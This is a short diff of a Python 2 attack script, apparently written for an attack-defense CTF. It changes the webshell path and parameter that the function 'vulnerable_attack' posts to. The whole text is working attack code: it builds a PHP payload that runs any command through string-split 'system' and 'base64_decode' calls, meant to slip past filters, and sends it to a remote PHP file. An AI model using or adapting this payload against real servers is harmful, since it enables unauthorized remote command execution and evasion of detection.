@@ -21,8 +21,8 @@ def vulnerable_attack(target,target_port,cmd):
         #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
         #print payload
         payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
-        data = '222=%s'% quote(payload) 
-        res = http("post",target,target_port,"/1.php",data,headers)
+        data = '2222=%s'% quote(payload) 
+        res = http("post",target,target_port,"/files/01b32df0393023ea5361283085d3782c.php",data,headers)
     except Exception,e:
         debug_print(traceback.format_exc())     
         dump_error("attack failed",target,"vulnerable attack")
